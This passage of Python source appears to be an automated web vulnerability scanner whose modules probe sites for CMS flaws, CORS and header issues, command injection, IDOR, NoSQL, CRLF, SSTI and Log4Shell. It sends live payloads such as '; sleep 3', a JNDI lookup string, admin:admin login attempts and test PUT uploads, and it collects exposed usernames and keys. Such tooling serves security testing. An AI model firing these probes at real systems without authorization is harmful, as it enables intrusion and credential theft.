    """Deep scan detected CMS — WordPress, Joomla, Drupal."""
    tech = job.tech_stack

    if "WordPress" in tech:
        _scan_wordpress(job)
    if "Joomla" in tech:
        _scan_joomla(job)
    if "Drupal" in tech:
        _scan_drupal(job)

    # Auto-detect if tech stack not already known
    if not any(t in tech for t in ["WordPress","Joomla","Drupal"]):
        r = job.req(job.url + "/wp-login.php")
        if r and r.status_code == 200 and "wordpress" in r.text.lower():
            job.tech_stack.append("WordPress"); _scan_wordpress(job)
        r = job.req(job.url + "/administrator/index.php")
        if r and r.status_code == 200 and "joomla" in r.text.lower():
            job.tech_stack.append("Joomla"); _scan_joomla(job)
        r = job.req(job.url + "/CHANGELOG.txt")
        if r and r.status_code == 200 and "drupal" in r.text.lower():
            job.tech_stack.append("Drupal"); _scan_drupal(job)


def _scan_wordpress(job):
    job.log("WordPress detected — deep scanning...", "WARN")

    # User enumeration
    r = job.req(job.url + "/wp-json/wp/v2/users")
    if r and r.status_code == 200:
        try:
            users = json.loads(r.text)
            usernames = [u.get("slug","") or u.get("name","") for u in users[:5]]
            if usernames:
                job.add_vuln("WordPress Vulnerability", job.url + "/wp-json/wp/v2/users",
                             evidence=f"REST API user enumeration — usernames: {', '.join(usernames)}",
                             extracted={"usernames": usernames})
                job.chain(f"WordPress user enumeration — {len(users)} users found: {usernames}")
        except:
            pass

    # Version detection
    r = job.req(job.url + "/readme.html")
    if r and r.status_code == 200:
        vm = re.search(r"Version (\d+\.\d+\.?\d*)", r.text)
        if vm:
            job.add_vuln("WordPress Vulnerability", job.url + "/readme.html",
                         evidence=f"WordPress version exposed in readme.html: {vm.group(1)}")

    # xmlrpc.php (bruteforce amplification)
    r = job.req(job.url + "/xmlrpc.php")
    if r and r.status_code == 200 and "xmlrpc" in r.text.lower():
        job.add_vuln("WordPress Vulnerability", job.url + "/xmlrpc.php",
                     evidence="xmlrpc.php accessible — allows brute-force amplification attacks (1 request = 1000 login attempts)")

    # Default creds on wp-login.php
    r = job.req(job.url + "/wp-login.php", method="POST",
                data={"log":"admin","pwd":"admin","wp-submit":"Log+In",
                      "redirect_to":"/wp-admin/","testcookie":"1"})
    if r and "/wp-admin" in r.url and "wp-admin" in r.text:
        job.add_vuln("Default Credentials", job.url + "/wp-login.php",
                     evidence="WordPress admin/admin login successful!")
        job.chain("WordPress admin login with admin:admin — full site compromise")


def _scan_joomla(job):
    job.log("Joomla detected — deep scanning...", "WARN")
    r = job.req(job.url + "/administrator/manifests/files/joomla.xml")
    if r and r.status_code == 200:
        vm = re.search(r"<version>(.*?)</version>", r.text)
        if vm:
            job.add_vuln("Joomla Vulnerability", job.url + "/administrator/manifests/files/joomla.xml",
                         evidence=f"Joomla version exposed: {vm.group(1)}")
    r = job.req(job.url + "/configuration.php~")
    if r and r.status_code == 200 and "JFactory" in r.text:
        job.add_vuln("Joomla Vulnerability", job.url + "/configuration.php~",
                     evidence="Joomla configuration backup file exposed — database credentials accessible")
        job.chain("Joomla configuration backup exposed — DB credentials likely leaked")


def _scan_drupal(job):
    job.log("Drupal detected — deep scanning...", "WARN")
    r = job.req(job.url + "/CHANGELOG.txt")
    if r and r.status_code == 200:
        vm = re.search(r"Drupal (\d+\.\d+)", r.text)
        if vm:
            ver = vm.group(1)
            job.add_vuln("Drupal Vulnerability", job.url + "/CHANGELOG.txt",
                         evidence=f"Drupal version exposed: {ver} — check for Drupalgeddon CVEs",
                         extracted={"version": ver})
            # Check for Drupalgeddon2 (CVE-2018-7600) — affects < 7.58 and 8.x < 8.3.9
            try:
                major, minor = int(ver.split(".")[0]), int(ver.split(".")[1])
                if (major == 7 and minor < 58) or (major == 8 and minor < 4):
                    job.add_vuln("Drupal Vulnerability", job.url,
                                 evidence=f"Drupalgeddon2 CVE-2018-7600 likely — v{ver} is in vulnerable range",
                                 extracted={"cve": "CVE-2018-7600"})
                    job.chain(f"Drupalgeddon2 (CVE-2018-7600) — Drupal {ver} is in vulnerable range")
            except:
                pass


# ── Module M: Rate Limiting Checker ──────────────────────────────────────────
def mod_rate_limit(job):
    """Test for missing rate limiting on login and API endpoints."""
    test_endpoints = ["/login","/signin","/api/login","/auth/login",
                      "/wp-login.php","/admin/login","/user/login"] +                      [u for u in job.urls if "login" in u.lower() or "auth" in u.lower()][:3]

    for endpoint in test_endpoints[:5]:
        target = job.url + endpoint if endpoint.startswith("/") else endpoint
        r0 = job.req(target)
        if not r0 or r0.status_code not in (200, 405, 302):
            continue

        # Send 15 rapid requests and check for 429/rate-limit response
        limited = False
        for i in range(15):
            try:
                r = requests.get(target, headers={"User-Agent": UAS[i % len(UAS)]},
                                 timeout=3, verify=False)
                if r.status_code == 429 or "too many" in r.text.lower() or "rate limit" in r.text.lower():
                    limited = True
                    job.log(f"Rate limiting active on {endpoint}", "OK")
                    break
            except:
                break

        if not limited:
            job.add_vuln("Rate Limiting Missing", target,
                         evidence=f"15 rapid requests to {endpoint} — no 429 or throttle detected",
                         extracted={"endpoint_type": "login/auth",
                                    "risk": "Brute-force and credential stuffing attacks possible"})
            return


# ── Module N: CSP Deep Analyzer ───────────────────────────────────────────────
def mod_csp(job):
    """Deep Content Security Policy analysis — detect bypasses and weaknesses."""
    r = job.req(job.url)
    if not r:
        return

    csp = r.headers.get("Content-Security-Policy", "")
    if not csp:
        job.add_vuln("CSP Weakness", job.url,
                     evidence="No Content-Security-Policy header — no XSS protection policy")
        job.csp_analysis = {"present": False}
        return

    issues = []
    directives = {}
    for part in csp.split(";"):
        part = part.strip()
        if " " in part:
            key, *vals = part.split()
            directives[key.lower()] = " ".join(vals)

    # Check dangerous directives
    if "unsafe-inline" in csp:
        issues.append("unsafe-inline — inline scripts/styles allowed, defeating XSS protection")
    if "unsafe-eval" in csp:
        issues.append("unsafe-eval — eval() allowed, code injection risk")
    if "'*'" in csp or "* " in csp or csp.strip().endswith("*"):
        issues.append("Wildcard (*) source — any origin can load resources")
    if "data:" in csp and "script-src" in csp:
        issues.append("data: URI in script-src — XSS bypass via data: URI possible")
    if "http:" in csp:
        issues.append("http: protocol in CSP — content downgrade possible")
    if "default-src" not in directives and "script-src" not in directives:
        issues.append("No default-src or script-src — scripts unrestricted")
    if "report-uri" not in csp and "report-to" not in csp:
        issues.append("No report-uri — CSP violations not monitored")

    job.csp_analysis = {"present": True, "directives": directives, "issues": issues}

    if issues:
        for issue in issues:
            job.add_vuln("CSP Weakness", job.url,
                         evidence=f"CSP issue: {issue}",
                         extracted={"directive_count": len(directives)})
        job.log(f"CSP analysis: {len(issues)} weaknesses found", "WARN")
    else:
        job.log("CSP analysis: Policy appears well-configured", "OK")


# ── Module O: CORS ────────────────────────────────────────────────────────────
def mod_cors(job):
    for origin in ["https://evil-phantom-test.com", "null",
                   f"https://{job.host}.evil.com", f"https://evil.{job.host}"]:
        r = job.req(job.url, headers={"Origin": origin, "User-Agent": UAS[0]})
        if not r:
            continue
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "false")
        if acao == origin:
            sev_note = "CRITICAL" if acac.lower() == "true" else "HIGH"
            job.add_vuln("CORS Misconfiguration", job.url,
                         evidence=f"Origin '{origin}' reflected. ACAC={acac} [{sev_note}]",
                         extracted={"reflected_origin": origin, "credentials_allowed": acac})
        elif acao == "*" and acac.lower() == "true":
            job.add_vuln("CORS Misconfiguration", job.url,
                         evidence="Wildcard ACAO with credentials=true — forbidden combination")


# ── Module P: Security Headers ────────────────────────────────────────────────
def mod_headers(job):
    r = job.req(job.url)
    if not r:
        return
    hlc = {k.lower(): v for k, v in r.headers.items()}

    for hdr, info in SECURITY_HEADERS.items():
        if hdr.lower() not in hlc:
            job.add_vuln(f"Missing Header ({info['risk']})", job.url,
                         evidence=f"No {hdr} — {info['desc']}",
                         extracted={"recommended": f"{hdr}: {info['rec']}"})
        else:
            val = hlc[hdr.lower()]
            if hdr == "Content-Security-Policy":
                if "unsafe-inline" in val:
                    job.add_vuln("Missing Header (MEDIUM)", job.url,
                                 evidence=f"Weak CSP: unsafe-inline present in: {val[:60]}")

    if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
        job.add_vuln("Clickjacking", job.url,
                     evidence="No X-Frame-Options or CSP frame-ancestors — site embeddable in iframes")

    for lh in ["Server","X-Powered-By","X-AspNet-Version","X-Generator","X-Runtime","X-Debug-Token"]:
        if lh.lower() in hlc:
            job.add_vuln("Info Disclosure", job.url,
                         evidence=f"{lh}: {hlc[lh.lower()]} — technology version exposed")


# ── Module Q: Cookie & Session Security ──────────────────────────────────────
def mod_cookies(job):
    r = job.req(job.url)
    if not r:
        return

    for ck in r.cookies:
        flags = []
        sc = r.headers.get("Set-Cookie","").lower()
        if not ck.secure:          flags.append("No Secure flag")
        if "httponly" not in sc:    flags.append("No HttpOnly flag")
        if "samesite" not in sc:    flags.append("No SameSite flag")
        if flags:
            job.add_vuln("Insecure Cookie", job.url, param=ck.name,
                         evidence=f"Cookie '{ck.name}': {', '.join(flags)}")

    # JWT detection and analysis
    jwt_re = r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
    for m in re.finditer(jwt_re, r.text + str(r.headers)):
        tok = m.group(0)
        try:
            hdr_raw = tok.split(".")[0]
            pld_raw = tok.split(".")[1]
            hdr_dec = json.loads(base64.urlsafe_b64decode(hdr_raw + "=="))
            pld_dec = json.loads(base64.urlsafe_b64decode(pld_raw + "=="))
            alg     = hdr_dec.get("alg", "?")
            claims  = list(pld_dec.keys())
            sens    = [k for k in pld_dec if k in ("password","pwd","secret","ssn","role","admin","is_admin")]
            evidence = f"JWT alg={alg} claims={claims[:6]}"
            if alg.lower() == "none":
                evidence += " — alg:none is CRITICAL (signature bypassed!)"
            if sens:
                evidence += f" — SENSITIVE claims: {sens}"
            job.add_vuln("JWT Issue", job.url,
                         evidence=evidence,
                         extracted={"algorithm": alg, "sensitive_claims": sens, "all_claims": claims[:10]})
        except:
            pass

    # CSRF token check
    for form in job.forms:
        if form["method"] == "POST":
            has_csrf = any(any(kw in n.lower() for kw in ["csrf","token","_token","xsrf","nonce"])
                          for n in form["inputs"])
            if not has_csrf:
                job.add_vuln("CSRF Missing Token", form["action"],
                             evidence="POST form without CSRF protection token")


# ── Module R: Command Injection ───────────────────────────────────────────────
def mod_cmdi(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    for param in params:
        t0 = time.time()
        tp = params.copy(); tp[param] = "; sleep 3"
        r  = job.req(url, params=tp)
        if r and time.time() - t0 > 3.0:
            job.add_vuln("Command Injection", url, param=param, payload="; sleep 3",
                         evidence="Response delayed >3s — time-based command injection confirmed")
            return
        for payload in CMD_PAYLOADS[:5]:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and any(ind in r.text for ind in CMD_INDICATORS):
                job.add_vuln("Command Injection", url, param=param, payload=payload,
                             evidence="OS command output detected in response")
                return


# ── Module S: IDOR ────────────────────────────────────────────────────────────
def mod_idor(job, url):
    params    = dict(parse_qsl(urlparse(url).query))
    num_params = {k: v for k, v in params.items() if v.isdigit() and int(v) > 0}
    if not num_params:
        return
    base_r = job.req(url)
    if not base_r:
        return

    for param, val in num_params.items():
        orig = int(val)
        for test_id in [orig+1, orig-1, 1, orig+100, 9999]:
            if test_id <= 0:
                continue
            tp = params.copy(); tp[param] = str(test_id)
            r  = job.req(url, params=tp)
            if r and r.status_code == 200 and abs(len(r.text) - len(base_r.text)) > 100:
                job.add_vuln("IDOR", url, param=param,
                             payload=f"{param}={test_id}",
                             evidence=f"ID {test_id} returned different data than ID {orig} — unauthorized access possible")
                return

    # HTTP verb tampering
    for method in ["PUT","DELETE","PATCH"]:
        r = job.req(url, method=method)
        if r and r.status_code not in (404, 405, 501, 403):
            job.add_vuln("IDOR", url,
                         payload=f"Method: {method}",
                         evidence=f"HTTP verb tampering — {method} {url} returned {r.status_code}")
            return


# ── Module T: Open Redirect ───────────────────────────────────────────────────
def mod_redirect(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    for param, val in params.items():
        if param.lower() in REDIRECT_PARAMS:
            for payload in REDIRECT_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                r  = job.req(url, params=tp, allow_redirects=False)
                if r and r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location","")
                    if "evil-phantom-test.com" in loc:
                        job.add_vuln("Open Redirect", url, param=param, payload=payload,
                                     evidence=f"Redirects to external domain: {loc}")
                        return


# ── Module U: Sensitive Files ──────────────────────────────────────────────────
def mod_files(job):
    base = job.url
    def probe(path):
        r = job.req(base + path, allow_redirects=False)
        if r and r.status_code in (200, 401, 403):
            return path, r.status_code, r.text[:3000]
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futs = {ex.submit(probe, p): p for p in SENSITIVE_FILES + ADMIN_PATHS}
        for fut in as_completed(futs):
            res = fut.result()
            if not res:
                continue
            path, status, content = res
            if status == 200:
                ext = {}
                if ".env" in path:
                    keys = re.findall(r"([A-Z_]+=\S+)", content)
                    if keys:
                        ext["env_keys"] = keys[:5]
                        job.chain(f".env exposed — {len(keys)} keys found including: {keys[0][:30]}")
                elif ".git/config" in path:
                    m = re.search(r"url\s*=\s*(.+)", content)
                    if m:
                        ext["repo_url"] = m.group(1).strip()
                        if "@" in m.group(1):
                            job.chain(f"Git remote URL contains embedded credentials: {m.group(1)[:60]}")
                elif "phpinfo" in path:
                    vm = re.search(r"PHP Version ([\d.]+)", content)
                    if vm:
                        ext["php_version"] = vm.group(1)
                elif "swagger" in path or "api-docs" in path:
                    eps = re.findall(r'"/([\w/{}\-]+)"', content)
                    if eps:
                        ext["api_endpoints"] = eps[:15]
                        job.chain(f"Swagger/OpenAPI docs exposed — {len(eps)} API endpoints enumerated")
                elif "backup" in path and ".sql" in path:
                    tables = re.findall(r"CREATE TABLE `?(\w+)`?", content)
                    if tables:
                        ext["sql_tables"] = tables[:10]
                        job.chain(f"SQL backup exposed — {len(tables)} tables: {', '.join(tables[:3])}")

                vtype = "Admin Panel Found" if path in ADMIN_PATHS else "Sensitive File Exposed"
                job.add_vuln(vtype, base + path,
                             evidence=f"HTTP 200 — {len(content)}B of sensitive content exposed",
                             extracted=ext)
                # Scan content for secrets
                for kt, pattern in JS_SECRETS.items():
                    m = re.search(pattern, content)
                    if m:
                        job.add_vuln("API Key Exposed", base + path,
                                     evidence=f"{kt}: {m.group(0)[:40]}...")
                        break


# ── Module V: Secret Scanner on all responses ─────────────────────────────────
def mod_secrets_scan(job, url):
    r = job.req(url)
    if not r:
        return
    for kt, pattern in JS_SECRETS.items():
        m = re.search(pattern, r.text)
        if m:
            val = m.group(0)[:100]
            if not any(val == s.get("value","")[:100] for s in job.secrets):
                sev = SECRET_SEV.get(kt, "HIGH")
                with job._lock:
                    job.secrets.append({"type": kt, "value": val, "url": url, "severity": sev})
                job.add_vuln("API Key Exposed", url,
                             evidence=f"{kt}: {val[:40]}...")


# ── Module W: Advanced Fingerprinting ─────────────────────────────────────────
def mod_fingerprint(job):
    """Advanced technology fingerprinting via error pages, timing, and headers."""
    r = job.req(job.url)
    if not r:
        return

    # Error page fingerprinting
    r_err = job.req(job.url + "/phantom_nonexistent_8x7z_page")
    if r_err:
        body = r_err.text.lower()
        fp_map = {
            "Apache": ["apache/", "apache http server"],
            "Nginx":  ["nginx/", "nginx error"],
            "IIS":    ["iis/", "internet information services", "microsoft-iis"],
            "Tomcat": ["apache tomcat/", "tomcat"],
            "Jetty":  ["jetty/", "eclipse jetty"],
            "Werkzeug/Flask": ["werkzeug", "debugger", "flask"],
            "Django": ["django", "debugtoolbar"],
            "Node.js": ["express", "cannot get /", "node.js"],
            "PHP":    ["<?php", "parse error", "fatal error:  uncaught"],
        }
        for server, sigs in fp_map.items():
            if any(s in body for s in sigs):
                if server not in job.tech_stack:
                    job.tech_stack.append(server)
                    job.log(f"Fingerprint (error page): {server}", "OK")

    # ETag format analysis
    etag = r.headers.get("ETag","")
    if etag:
        if re.match(r'".+-\d+-\d+"', etag):  # Apache inode-size-mtime
            job.log("ETag format suggests Apache (inode-based)", "OK")
            if "Apache" not in job.tech_stack:
                job.tech_stack.append("Apache")
        elif re.match(r'"[0-9a-f]{32}"', etag):  # MD5-based
            job.log("ETag format suggests hash-based (Node/nginx)", "OK")

    # Check for debug mode
    if any(kw in r.text.lower() for kw in ["debug=true","app.debug","debug_toolbar","__debug__"]):
        job.add_vuln("Info Disclosure", job.url,
                     evidence="Debug mode appears enabled — stack traces and config data may be exposed")

    # Check HTTP/2 support
    try:
        import http.client
        parsed = urlparse(job.url)
        conn = http.client.HTTPSConnection(parsed.hostname, timeout=5)
        conn.connect()
        job.log(f"HTTP version: {conn.response_class.__name__}", "OK")
    except:
        pass


# ══ NEW VULNERABILITY MODULES (extended coverage) ════════════════════════════

# ── Module X: NoSQL Injection ─────────────────────────────────────────────────
def mod_nosqli(job, url):
    """MongoDB-style operator injection in query params (auth bypass / extraction)."""
    params = dict(parse_qsl(urlparse(url).query))
    if not params:
        return
    base = job.req(url)
    if not base:
        return
    for param in params:
        for payload in NOSQL_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r = job.req(url, params=tp)
            if not r:
                continue
            low = r.text.lower()
            if any(e in low for e in NOSQL_ERRORS):
                job.add_vuln("NoSQL Injection", url, param=param, payload=payload,
                             evidence="NoSQL/MongoDB error signature reflected — operator injection likely")
                return
            # Boolean-based: $ne/$gt returning a much larger authenticated-like page
            if r.status_code == 200 and len(r.text) - len(base.text) > 250 and "$" in payload:
                job.add_vuln("NoSQL Injection", url, param=param, payload=payload,
                             evidence="Operator payload returned materially more data — possible auth/filter bypass")
                return


# ── Module Y: Host Header Injection ───────────────────────────────────────────
def mod_host_header(job):
    """Tests password-reset poisoning / routing-based Host header trust."""
    evil = "evil-phantom-test.com"
    for hdrs in ({"Host": evil},
                 {"X-Forwarded-Host": evil},
                 {"Host": job.host, "X-Forwarded-Host": evil}):
        r = job.req(job.url, headers=hdrs, allow_redirects=False)
        if not r:
            continue
        loc = r.headers.get("Location", "")
        if evil in loc:
            job.add_vuln("Host Header Injection", job.url, payload=str(hdrs),
                         evidence=f"Injected host reflected in Location: {loc[:70]}")
            return
        if evil in r.text:
            job.add_vuln("Host Header Injection", job.url, payload=str(hdrs),
                         evidence="Injected Host value reflected in response body (reset-link poisoning risk)")
            return


# ── Module Z: CRLF Injection / HTTP Response Splitting ────────────────────────
def mod_crlf(job, url):
    params = dict(parse_qsl(urlparse(url).query)) or {"q": "1", "redirect": "1"}
    targets = list(params.keys())[:4]
    for param in targets:
        for payload in CRLF_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r = job.req(url, params=tp, allow_redirects=False)
            if not r:
                continue
            hdr_blob = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            if "phantom-crlf" in hdr_blob or "phantomcrlf" in hdr_blob:
                job.add_vuln("CRLF Injection", url, param=param, payload=payload,
                             evidence="Injected CRLF created a new response header — HTTP response splitting")
                return


# ── Module AA: Subdomain Takeover ─────────────────────────────────────────────
def mod_subdomain_takeover(job):
    """Checks discovered subdomains for dangling-CNAME takeover fingerprints."""
    candidates = list(job.subdomains)[:25]
    if not candidates:
        return

    def check(sub):
        for scheme in ("https://", "http://"):
            try:
                r = requests.get(scheme + sub, timeout=TIMEOUT, verify=False,
                                 headers={"User-Agent": UAS[0]}, allow_redirects=True)
            except Exception:
                continue
            body = r.text.lower()
            for service, sig in TAKEOVER_FINGERPRINTS.items():
                if sig in body:
                    return sub, service
            return None
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for fut in as_completed([ex.submit(check, s) for s in candidates]):
            try:
                res = fut.result()
            except Exception:
                res = None
            if res:
                sub, service = res
                job.add_vuln("Subdomain Takeover", sub, payload=service,
                             evidence=f"{sub} serves '{service}' not-found page — dangling record, takeover possible")
                job.chain(f"Subdomain takeover on {sub} via unclaimed {service} resource")


# ── Module AB: DOM-based XSS (static JS analysis) ─────────────────────────────
def mod_dom_xss(job):
    """Flags client-side XSS where a tainted source flows toward a dangerous sink."""
    seen = 0
    for js_url in list(job.js_files)[:25]:
        r = job.req(js_url)
        if not r:
            continue
        low = r.text.lower()
        sinks   = [s for s in DOM_XSS_SINKS if s in low]
        sources = [s for s in DOM_XSS_SOURCES if s in low]
        if sinks and sources:
            job.add_vuln("DOM XSS", js_url,
                         evidence=f"Tainted source ({sources[:3]}) reaches sink ({sinks[:3]}) in client JS",
                         extracted={"sources": sources[:5], "sinks": sinks[:5]})
            seen += 1
            if seen >= 5:
                return
    # also inspect inline scripts of the main page
    r = job.req(job.url)
    if r:
        for sc in re.findall(r"<script[^>]*>(.*?)</script>", r.text, re.S | re.I):
            low = sc.lower()
            sinks   = [s for s in DOM_XSS_SINKS if s in low]
            sources = [s for s in DOM_XSS_SOURCES if s in low]
            if sinks and sources:
                job.add_vuln("DOM XSS", job.url,
                             evidence=f"Inline script: source {sources[:2]} flows to sink {sinks[:2]}")
                return


# ── Module AC: Insecure Deserialization indicators ────────────────────────────
def mod_deserialization(job):
    r = job.req(job.url)
    if not r:
        return
    blob = r.text + str(dict(r.headers)) + str(r.cookies.get_dict())
    for name, pattern in DESER_MARKERS.items():
        m = re.search(pattern, blob)
        if m:
            job.add_vuln("Insecure Deserialization", job.url,
                         payload=name, evidence=f"{name} marker present in response/cookie — untrusted deserialization risk")
            if name == ".NET ViewState" and "__VIEWSTATEGENERATOR" in blob and "viewstateuserkey" not in blob.lower():
                job.chain("ASP.NET __VIEWSTATE present without MAC/UserKey hardening — deserialization gadget risk")
            return


# ── Module AD: Dangerous HTTP Methods + XST ───────────────────────────────────
def mod_http_methods(job):
    allowed = []
    r = job.req(job.url, method="OPTIONS")
    if r and r.headers.get("Allow"):
        allowed = [m.strip().upper() for m in r.headers["Allow"].split(",")]
        risky = [m for m in allowed if m in ("PUT", "DELETE", "PATCH", "PROPFIND", "CONNECT")]
        if risky:
            job.add_vuln("Dangerous HTTP Method", job.url,
                         payload=",".join(risky),
                         evidence=f"OPTIONS advertises state-changing methods: {', '.join(risky)}")
    # Active probe for TRACE (XST) and PUT
    rt = job.req(job.url, method="TRACE")
    if rt and rt.status_code == 200 and ("TRACE" in rt.text or job.host in rt.text):
        job.add_vuln("Cross-Site Tracing (XST)", job.url, payload="TRACE",
                     evidence="TRACE enabled and echoes the request — Cross-Site Tracing possible")
    rp = job.req(job.url.rstrip("/") + "/phantom_put_test.txt", method="PUT",
                 data="phantom-put-test")
    if rp and rp.status_code in (200, 201, 204):
        job.add_vuln("Dangerous HTTP Method", job.url, payload="PUT",
                     evidence=f"PUT returned {rp.status_code} — arbitrary file upload / WebDAV likely enabled")


# ── Module AE: Directory Listing ──────────────────────────────────────────────
def mod_dir_listing(job):
    dirs = set()
    for u in list(job.urls)[:60]:
        path = urlparse(u).path
        if "/" in path.rstrip("/"):
            dirs.add(job.url.rstrip("/") + path.rsplit("/", 1)[0] + "/")
    dirs.update(job.url.rstrip("/") + d + "/" for d in
                ["/uploads", "/images", "/img", "/files", "/backup", "/assets",
                 "/static", "/data", "/tmp", "/css", "/js", "/docs", "/download"])
    SIGS = ["index of /", "<title>index of", "directory listing for",
            "[to parent directory]", "parent directory</a>"]

    def probe(d):
        r = job.req(d)
        if r and r.status_code == 200 and any(s in r.text.lower() for s in SIGS):
            return d
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for fut in as_completed([ex.submit(probe, d) for d in list(dirs)[:30]]):
            d = fut.result()
            if d:
                job.add_vuln("Directory Listing", d,
                             evidence="Auto-index enabled — directory contents are browsable")


# ── Module AF: Mixed Content (HTTP assets on HTTPS) ───────────────────────────
def mod_mixed_content(job):
    if not job.url.lower().startswith("https://"):
        return
    r = job.req(job.url)
    if not r:
        return
    insecure = set(re.findall(r'(?:src|href)\s*=\s*["\'](http://[^"\']+)["\']',
                              r.text, re.I))
    insecure = {u for u in insecure if not u.startswith("http://localhost")}
    if insecure:
        job.add_vuln("Mixed Content", job.url,
                     evidence=f"{len(insecure)} HTTP asset(s) loaded over HTTPS page — MITM injection risk",
                     extracted={"sample": list(insecure)[:5]})


# ── Module AG: Email Security (SPF / DMARC / DKIM via DNS) ─────────────────────
def mod_email_security(job):
    if not DNS_OK:
        return
    domain = ".".join(job.host.split(".")[-2:]) if job.host.count(".") >= 1 else job.host
    spf = dmarc = False
    try:
        for rec in dns.resolver.resolve(domain, "TXT"):
            if "v=spf1" in str(rec).lower():
                spf = True
    except Exception:
        pass
    try:
        for rec in dns.resolver.resolve("_dmarc." + domain, "TXT"):
            if "v=dmarc1" in str(rec).lower():
                dmarc = True
    except Exception:
        pass
    missing = []
    if not spf:   missing.append("SPF")
    if not dmarc: missing.append("DMARC")
    if missing:
        job.add_vuln("Email Spoofing (SPF/DMARC)", domain,
                     payload=",".join(missing),
                     evidence=f"Missing {', '.join(missing)} record(s) — domain can be spoofed in phishing email")


# ── Module AH: Open Cloud Storage buckets ─────────────────────────────────────
def mod_cloud_storage(job):
    base = job.host.split(".")[0]
    names = {base, base + "-assets", base + "-static", base + "-backup",
             base + "-uploads", base + "-media", base + "-prod", base + "-dev"}
    tested = []
    for n in list(names)[:8]:
        tested.append(("AWS S3", f"https://{n}.s3.amazonaws.com/"))
        tested.append(("GCS", f"https://storage.googleapis.com/{n}/"))
        tested.append(("Azure Blob", f"https://{n}.blob.core.windows.net/?comp=list"))

    def probe(item):
        provider, u = item
        try:
            r = requests.get(u, timeout=TIMEOUT, verify=False,
                             headers={"User-Agent": UAS[0]})
        except Exception:
            return None
        low = r.text.lower()
        if r.status_code == 200 and ("<listbucketresult" in low or "<enumerationresults" in low
                                     or "<contents>" in low):
            return provider, u
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for fut in as_completed([ex.submit(probe, it) for it in tested]):
            res = fut.result()
            if res:
                provider, u = res
                job.add_vuln("Open Cloud Storage", u, payload=provider,
                             evidence=f"Public {provider} bucket lists contents without auth")
                job.chain(f"Publicly listable {provider} bucket discovered: {u}")


# ── Module AI: Log4Shell / JNDI injection probe ───────────────────────────────
def mod_log4shell(job):
    """Out-of-band-safe heuristic probe (collaborator-free): looks for error/echo."""
    marker = "phantom-jndi-test"
    payload = "${jndi:ldap://" + marker + ".invalid/a}"
    for hdr in LOG4SHELL_HEADERS:
        r = job.req(job.url, headers={hdr: payload})
        if not r:
            continue
        # If the lookup string is parsed/echoed back changed, or triggers a 500 stack trace
        if "jndi" in r.text.lower() and "ldap" in r.text.lower() and r.status_code >= 500:
            job.add_vuln("Log4Shell (JNDI)", job.url, param=hdr, payload=payload,
                         evidence="JNDI payload triggered a server error referencing the lookup — log4j RCE suspected")
            job.chain("Log4Shell (CVE-2021-44228) — JNDI lookup appears to be evaluated server-side")
            return


# ── Module AJ: Reverse Tabnabbing ─────────────────────────────────────────────
def mod_tabnabbing(job):
    r = job.req(job.url)
    if not r:
        return
    bad = 0
    for m in re.finditer(r"<a\b[^>]*target\s*=\s*[\"']?_blank[\"']?[^>]*>", r.text, re.I):
        tag = m.group(0).lower()
        if "noopener" not in tag and "noreferrer" not in tag:
            bad += 1
    if bad:
        job.add_vuln("Reverse Tabnabbing", job.url,
                     evidence=f"{bad} link(s) use target=_blank without rel=noopener — window.opener phishing")


# ── Module AK: Cacheable sensitive pages ──────────────────────────────────────
def mod_cache_control(job):
    sensitive = ["/account", "/profile", "/dashboard", "/settings", "/my-account",
                 "/user", "/orders", "/billing"]
    for p in sensitive:
        r = job.req(job.url.rstrip("/") + p, allow_redirects=False)
        if not r or r.status_code != 200:
            continue
        cc = r.headers.get("Cache-Control", "").lower()
        if not cc or ("no-store" not in cc and "private" not in cc and "no-cache" not in cc):
            job.add_vuln("Cacheable Sensitive Page", job.url.rstrip("/") + p,
                         evidence=f"Authenticated-style page lacks Cache-Control no-store/private (got: '{cc or 'none'}')")
            return


# ── Module AL: WebSocket exposure ─────────────────────────────────────────────
def mod_websocket(job):
    found = set()
    for u in [job.url] + list(job.js_files)[:20]:
        r = job.req(u)
        if not r:
            continue
        for m in re.finditer(r"wss?://[A-Za-z0-9_.:/\-]+", r.text):
            found.add(m.group(0))
    for ws in list(found)[:5]:
        scheme_ok = ws.startswith("wss://")
        job.add_vuln("WebSocket Vulnerability", ws,
                     evidence=("WebSocket endpoint found"
                               + ("" if scheme_ok else " over plaintext ws:// (no TLS)")
                               + " — verify Origin check & auth on handshake"))


# ── Module AM: security.txt / responsible disclosure ──────────────────────────
def mod_well_known(job):
    for p in ["/.well-known/security.txt", "/security.txt"]:
        r = job.req(job.url.rstrip("/") + p)
        if r and r.status_code == 200 and "contact" in r.text.lower():
            return
    job.add_vuln("Missing security.txt", job.url,
                 evidence="No RFC 9116 security.txt found — no machine-readable disclosure contact")


# ══ ROUND-2 VULNERABILITY MODULES (deep coverage) ════════════════════════════

# ── Module AN: Multi-engine SSTI (arithmetic-marker confirmed) ────────────────
def mod_ssti_advanced(job, url):
    """Confirms server-side template injection by forcing 1337*1337=1787569."""
    params = dict(parse_qsl(urlparse(url).query))
    if not params:
        return
    for param in list(params)[:6]:
        for payload in SSTI_TEMPLATE_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r = job.req(url, params=tp)
            if r and SSTI_MARKER in r.text and payload not in r.text:
                job.add_vuln("SSTI", url, param=param, payload=payload,
                             evidence=f"Template engine evaluated {payload} -> {SSTI_MARKER} (RCE-class)")
                job.chain(f"SSTI on {param} -> template engine executes expressions -> path to RCE")
                return


# ── Module AO: Expression Language / OGNL / SpEL injection ─────────────────────
def mod_el_injection(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    if not params:
        return
    for param in list(params)[:6]:
        for payload in EL_PAYLOADS:
